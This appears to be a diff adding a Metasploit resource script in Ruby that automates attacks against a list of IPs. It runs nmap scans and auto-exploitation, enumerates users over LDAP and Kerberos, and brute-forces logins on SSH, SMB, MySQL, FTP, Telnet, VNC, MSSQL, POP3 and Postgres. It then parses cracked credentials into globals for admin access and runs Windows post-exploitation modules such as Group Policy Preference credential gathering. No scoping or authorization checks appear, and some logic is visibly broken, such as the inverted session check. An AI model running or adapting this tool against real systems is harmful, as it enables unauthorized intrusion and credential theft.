@@ -1,0 +1,980 @@
+<ruby>
+# Scan loop on all IPs 
+# To do most of job, install pentest plugin first
+# Install my reportEmail plugin to send PDF reports to email
+# mkdir –p $HOME/.msf4/plugins
+# cd $HOME/.msf4/plugins
+# wget https://raw.github.com/darkoperator/Metasploit-Plugins/master/pentest.rb
+
+path='/root/IPs.txt'
+ip=''
+remains=''
+line=''
+each=''
+before=''
+userfile=nil
+$ADMUSER=''
+$ADMPASS=''
+$sshuser = []
+$sshpass = []
+$mysuser = []
+$myspass = []
+$smbuser = []
+$smbpass = []
+$ftpuser = []
+$ftppass = []
+$teluser = []
+$telpass = []
+$vncuser = []
+$vncpass = []
+$sqluser = []
+$sqlpass = []
+$popuser = []
+$poppass = []
+$psqluse = []
+$psqlpas = []
+
+# Defines LHOST from attacker's machine
+ip  = %x|hostname -I|
+run_single("setg LHOST #{ip}")
+
+# Defines number of threads on brute force
+cores = %x|nproc --all|
+
+# Function to get users input on Metasploit
+def getin()
+        return $stdin.readline
+end
+
+# Function to decode base64 strings on report
+def decode64(target)
+counter=''
+decoded=''
+escaped=''
+
+	counter = %x|xmlstarlet sel -t -v "count(//MetasploitV5/hosts/host/notes/note/data)" "/root/#{target}.xml"|
+
+	i=1
+	loop do
+		decoded = %x(xmlstarlet sel -T -t -v "//MetasploitV5/hosts/host/notes/note[#{i}]/data" "/root/#{target}.xml" | base64 -d)
+		escaped = decoded.gsub!(/[^\w\d\s[[:punct:]]]/, '')
+		escaped = escaped.gsub!(/"|{|[[:cntrl:]]/, ' ')
+			if ($?.exitstatus == 0)
+				print_line("#{escaped}")
+				`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/notes/note[#{i}]/data" -v "#{escaped}" "/root/#{target}.xml"`
+			end
+		i += 1
+		break if ("#{i}" == "#{counter}")
+	end
+end
+
+# This function inserts any passwords found on brute force scans into report. For this, install xmlstarlet tool
+def bruteforce()
+run_single("db_export -f pwdump -a /root/pwdump.txt")
+
+credssh=nil
+credmys=nil
+credsmb=nil
+credftp=nil
+credtel=nil
+credvnc=nil
+credsql=nil
+credpop=nil
+crepsql=nil
+hassh = Hash.new
+hamys = Hash.new
+hasmb = Hash.new
+haftp = Hash.new
+hatel = Hash.new
+havnc = Hash.new
+hasql = Hash.new
+hapop = Hash.new
+hapsq = Hash.new
+count=0
+nextline=0
+
+File.open("/root/pwdump.txt").each_line do |line|
+nextline += 1
+        if (line =~ /[Ss][Ss][Hh]/)
+	        hassh["credssh#{count}"] = nextline
+	        count = count + 1
+	elsif  (line =~ /[Mm][Yy][Ss][Qq][Ll]/)
+		hamys["credmys#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Mm][Yy][Ss][Qq][Ll]/ or line =~ /[Mm]icrosoft-[Dd][Ss]/ or line =~ /[Nn]etbios-[Ss][Ss][Nn]/)
+		hasmb["credsmb#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Ff][Tt][Pp]/)
+		haftp["credftp#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Tt]elnet/)
+		hatel["credtel#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Vv][Nn][Cc]/)
+		havnc["credvnc#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Mm][Ss][Ss]ql/)
+		hasql["credsql#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Pp][Oo][Pp]3/)
+		hapop["credpop#{count}"] = nextline
+		count = count + 1
+	elsif  (line =~ /[Pp]ostgres/)
+		hapsq["crepsql#{count}"] = nextline
+		count = count + 1
+	end
+end
+
+file = File.readlines("/root/pwdump.txt")
+
+if ("#{hassh.length}" != 0)
+hassh.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$sshuser.push("#{wrd}")
+		else
+			$sshpass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{hamys.length}" != 0)
+hamys.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$mysuser.push("#{wrd}")
+		else
+			$myspass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{hasmb.length}" != 0)
+hasmb.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$smbuser.push("#{wrd}")
+		else
+			$smbpass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{haftp.length}" != 0)
+haftp.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$ftpuser.push("#{wrd}")
+		else
+			$ftppass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{hatel.length}" != 0)
+hatel.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$teluser.push("#{wrd}")
+		else
+			$telpass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{havnc.length}" != 0)
+havnc.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$vncuser.push("#{wrd}")
+		else
+			$vncpass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{hasql.length}" != 0)
+hasql.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$sqluser.push("#{wrd}")
+		else
+			$sqlpass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{hapop.length}" != 0)
+hapop.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$popuser.push("#{wrd}")
+		else
+			$poppass.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ("#{hapsq.length}" != 0)
+hapsq.each do |key, value|
+	file[value].split.each_with_index do |wrd, idx| 
+		if ((idx) % 2 == 0)
+			$psqluse.push("#{wrd}")
+		else
+			$psqlpas.push("#{wrd}")
+		end	
+	end
+end
+end
+
+if ($?.success?)
+	File.delete("/root/pwdump.txt")
+end
+
+# If got admin credentials, define them as globals to future tests
+if ("#{$smbuser.length}" != 0)
+i=0
+    while "#{i}" <= "#{$smbuser.length}"
+        if ("#{$smbuser[i]}" =~ /[Aa]dministra\w+/)
+            $ADMUSER = "#{$smbuser[i]}" 
+            $ADMPASS = "#{$smbpass[i]}" 
+	    break
+        end 
+    i += 1
+    end 
+
+elsif ("#{$sshuser.length}" != 0)
+i=0
+    while "#{i}" <= "#{$sshuser.length}"
+        if ("#{$sshuser[i]}" =~ /root/)
+            $ADMUSER  = "#{$sshuser[i]}" 
+            $ADMPASS  = "#{$sshpass[i]}" 
+	    break
+        end 
+    i += 1
+    end 
+end 
+
+end
+
+# Insert any credentials found into XML temporary file report
+def edtxml(target)
+
+target="#{target}".chomp
+
+if (! $sshuser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/module" -t elem -n password -v "#{$sshpass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/username"  -v "#{$sshuser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $sshuser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "/MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/ssh/ssh_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/module" -t elem -n username -v "#{$sshuser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ssh/ssh_login']["#{j}"]/module" -t elem -n password -v "#{$sshpass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $sshuser.length)
+                       break
+                end
+end
+end
+end
+
+if (! $mysuser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/module" -t elem -n password -v "#{$myspass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/username" -v "#{$mysuser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $mysuser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/mysql/mysql_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/module" -t elem -n username -v "#{$mysuser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mysql/mysql_login']["#{j}"]/module" -t elem -n password -v "#{$myspass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $mysuser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $smbuser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/module" -t elem -n password -v "#{$smbpass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/username" -v "#{$smbuser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $smbuser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/smb/smb_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/module" -t elem -n username -v "#{$smbuser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/smb/smb_login']["#{j}"]/module" -t elem -n password -v "#{$smbpass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $smbuser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $ftpuser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/module" -t elem -n password -v "#{$ftppass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/username" -v "#{$ftpuser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $ftpuser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/ftp/ftp_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/module" -t elem -n username -v "#{$ftpuser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/ftp/ftp_login']["#{j}"]/module" -t elem -n password -v "#{$ftppass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $ftpuser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $teluser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/module" -t elem -n password -v "#{$telpass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/username" -v "#{$teluser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $teluser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/telnet/telnet_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/module" -t elem -n username -v "#{$teluser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/telnet/telnet_login']["#{j}"]/module" -t elem -n password -v "#{$telpass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $teluser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $vncuser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/module" -t elem -n password -v "#{$vncpass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/username" -v "#{$vncuser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $vncuser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/vnc/vnc_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/module" -t elem -n username -v "#{$vncuser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/vnc/vnc_login']["#{j}"]/module" -t elem -n password -v "#{$vncpass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $vncuser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $sqluser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/module" -t elem -n password -v "#{$sqlpass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/username" -v "#{$sqluser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $sqluser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/mssql/mssql_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/module" -t elem -n username -v "#{$sqluser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/mssql/mssql_login']["#{j}"]/module" -t elem -n password -v "#{$sqlpass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $sqluser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $popuser.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/module" -t elem -n password -v "#{$poppass[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/username" -v "#{$popuser[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $popuser.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/pop3/pop3_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/module" -t elem -n username -v "#{$popuser[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/pop3/pop3_login']["#{j}"]/module" -t elem -n password -v "#{$poppass[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $popuser.length)
+                        break
+                end
+end
+end
+end
+
+if (! $psqluse.empty?)
+`xmlstarlet sel -t  -v "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']/module" "/root/#{target}.xml"`
+if ($?.exitstatus == 0)
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/module" -t elem -n password -v "#{$psqlpas[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -u "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/username" -v "#{$psqluse[i]}" "/root/#{target}.xml"`
+	i += 1
+	j += 1
+		if (i == $psqluse.length)
+			break
+		end
+end
+
+else
+i=0
+j=1
+loop do
+`xmlstarlet ed -L -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts" -t elem -n "vuln_attempt" -v "" -s "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[last()]" -t elem -n "module" -v "auxiliary/scanner/postgres/postgres_login" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/module" -t elem -n username -v "#{$psqluse[i]}" "/root/#{target}.xml"`
+`xmlstarlet ed -L -i "//MetasploitV5/hosts/host/vulns/vuln/vuln_attempts/vuln_attempt[module='auxiliary/scanner/postgres/postgres_login']["#{j}"]/module" -t elem -n password -v "#{$psqlpas[i]}" "/root/#{target}.xml"`
+        i += 1
+	j += 1
+                if (i == $psqluse.length)
+                        break
+                end
+end
+end
+end
+
+end
+
+# Windows services tests
+def smb(target)
+# define admin credentials as globals to post tests
+if ( "#{$ADMUSER}" != '' && "#{$ADMPASS}" != '')
+    run_single("setg SMBUser = #{$ADMUSER}")
+    run_single("setg SMBPass = #{$ADMPASS}")
+end 
+
+# smb_version determines the version of the SMB service that is running
+run_single("setg RHOST #{target}")
+run_single("use auxiliary/scanner/smb/smb_version")
+run_single("run")
+run_single("back")
+
+# pipe_auditor determine what named pipes are available over SMB:
+run_single("use auxiliary/scanner/smb/pipe_auditor")
+run_single("run")
+run_single("back")
+
+# pipe_dcerpc_auditor return the DCERPC services that can be accessed via a SMB
+run_single("use auxiliary/scanner/smb/pipe_dcerpc_auditor")
+run_single("run")
+run_single("back")
+
+# smb2 determines if target supports the SMB2 protocol.
+run_single("use auxiliary/scanner/smb/smb2")
+run_single("run")
+run_single("back")
+
+# smb_enumshares enumerates any SMB shares available
+run_single("use auxiliary/scanner/smb/smb_enumshares")
+run_single("run")
+run_single("back")
+
+# smb_enumusers numerate the users on the target via SMB RPC service
+run_single("use auxiliary/scanner/smb/smb_enumusers")
+run_single("run")
+run_single("back")
+
+# smb_lookupsid brute-forces SID lookups on target to determine what local users exist the system
+run_single("use auxiliary/scanner/smb/smb_lookupsid")
+run_single("run")
+run_single("back")
+end
+
+# After windows exploitation, enumerate his resources
+def postenum()
+if (framework.sessions.length <= 0)
+      # Enumerate all logged on users
+      run_single("use post/windows/gather/enum_logged_on_users")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Gather All Group Policy Preference
+      run_single("use post/windows/gather/credentials/gpp")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Find All Services in Server
+      run_single("use post/windows/gather/enum_services")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Find All Installed Applications in Server
+      run_single("use post/windows/gather/enum_applications")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")
+      # Find All Remote Desktop Sessions
+      run_single("use post/windows/gather/enum_termserv")
+      run_single("set SESSION 1")
+      run_single("exploit")
+      run_single("back")      
+end
+end 
+
+# wordlists
+pathdefault = "/usr/share/metasploit-framework/data/wordlists/"
+print_line("The user and password lists already been set, but you can adjust to yours...")
+print_line("It defaults to #{pathdefault}{unix_users.txt,unix_passwords.txt}")
+print_line("if so, just hit ENTER, else copy these files to that directory and just pass your names here.")
+print_line("...then happy cracking!")
+print_line("Users filename:")
+user_file = getin
+user_file = user_file.chomp
+print_line("Passwords filename:")
+pass_file = getin
+pass_file = pass_file.chomp
+
+if (user_file != '')
+	run_single("setg USER_FILE #{pathdefault}#{user_file}")
+else
+	run_single("setg USER_FILE #{pathdefault}unix_users.txt")
+end
+if (pass_file != '')
+	run_single("setg PASS_FILE #{pathdefault}#{pass_file}")
+else
+	run_single("setg PASS_FILE #{pathdefault}unix_passwords.txt")
+end
+
+# Start of scan
+run_single("load reportEmail")
+run_single("load pentest")
+Dir.chdir('/root')
+File.foreach(path) { |each|
+File.open(path, 'r') {|file| line=file.gets; remains=file.read}
+# Creating workspace
+  run_single("workspace -a #{line}")
+  run_single("workspace #{line}")  
+# Define target's IP
+  run_single("setg RHOSTS #{line}")
+  run_single("db_nmap #{line} -sS -O")
+  sleep 10
+  run_single("db_nmap -sU -P0 --max-retries 1 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{line}")
+  sleep 10
+  run_single("discover_db -r #{line}/32")
+  run_single("vuln_exploit -j 1")
+if ("#{before}" != '')
+  run_single("hosts -d #{before}")
+end
+  before="#{line}"
+
+# Test if we get some system users via LDAP or MS AD
+framework.db.hosts.each do |host|
+	if (host.os_name =~ /[Ll]inux/)
+		host.services.each do |serv|
+			if (serv.state == Msf::ServiceState::Open)
+				if (serv.port.to_i == 389)
+					# search for users via LDAP anonymous bind
+					# need the ldap-utils package
+					# it can't run within a function
+					shell = []
+					arr = []
+					names = []
+					str = nil
+					fmts = nil
+					org = nil
+					shell = %x|nmap -sV -p 389 --script ldap-rootdse #{line}|
+					shell.each_line do |line|
+        					if (line =~ /namingContexts/)
+                					str = line
+                					fmts = "#{str}".squeeze(' ')
+                					arr = fmts.split(" ")
+                					org = arr[2]
+							print_line(org)
+							break
+						end
+					end
+
+					names = %x|ldapsearch -LLL -w '' -x -h "#{line}" -b "#{org}" dn|
+					print_line(names)
+						if ($?.success?)
+							names = names.gsub!("\n\n", "\n")
+							names = names.gsub!(/dn: uid=|cn=|,.*/) { '' }
+							if (names =~ /dn: /)
+			        				names.gsub!(/dn:.*\n/, '')
+							end
+							file = File.open("/root/uid.txt", "w")
+							file.puts(names)
+							file.close
+						end
+				end
+			end
+		end
+	else 
+	host.services.each do |serv|
+		if (serv.state == Msf::ServiceState::Open)
+			if (serv.port.to_i == 389)
+				# search for users via LDAP anonymous bind,
+				# and if it don't succeed, try via anonymous kerberos service
+				shell = []
+				arr = []
+				names = []
+				str = nil
+				fmts = nil
+				org = nil
+				shell = %x|nmap -sV -p 389 --script ldap-rootdse #{line}|
+				shell.each_line do |line|
+				        if (line =~ /namingContexts/)
+				                str = line
+				                fmts = "#{str}".squeeze(' ')
+				                arr = fmts.split(" ")
+				                org = arr[2]
+						print_line(org)
+						break
+					end
+				end
+
+				if ($?.success?)
+					map = {'DC=' => '', ',' => '.'}
+					re = Regexp.new(map.keys.map { |x| Regexp.escape(x) }.join('|'))
+					dom = org.gsub!(re, map).upcase
+					run_single("use auxiliary/gather/kerberos_enumusers")
+					run_single("set RHOST #{line}")
+					run_single("set DOMAIN #{dom}")
+					run_single("set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt")
+					run_single("run")
+					run_single("back")
+					run_single("creds -o /root/uid.tmp")
+					# find server domain name
+					down = dom.downcase.split(".", 2)
+					domain = down[1]
+					run_single("setg DOMAIN #{domain}")
+
+					i=10
+					logins = []
+					file = File.open("uid.tmp")
+					data = File.read("uid.tmp").split(',')
+
+					while i < data.length
+						logins.push(data[i].gsub!('"', ''))
+						i=i+7
+					end
+
+					f = File.open("/root/uid.txt", "w+")  { |f| logins.each { |line| f << "#{line}\n"} }
+					File.delete("/root/uid.tmp")
+				end
+			end
+		end
+	end
+end
+end
+
+# If we have found some users, put them on users file
+if (File.exist?('/root/uid.txt') and !(File.zero?('/root/uid.txt')))
+	run_single("setg USER_FILE /root/uid.txt")
+	userfile = true
+end
+
+# If exploits don't work, try brute force on services
+if (framework.sessions.length <= 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]inux/)
+        run_single("set VERBOSE true")
+        run_single("set THREADS #{cores}")
+        run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc")
+    elsif (host.os_name =~ /[Ww]indows/)
+        run_single("set VERBOSE true")
+	run_single("set THREADS #{cores}")
+	run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc")
+    end
+  end
+end
+
+# If it found some credentials, save them to later use
+if (framework.db.creds.length > 0)
+	bruteforce()
+end
+
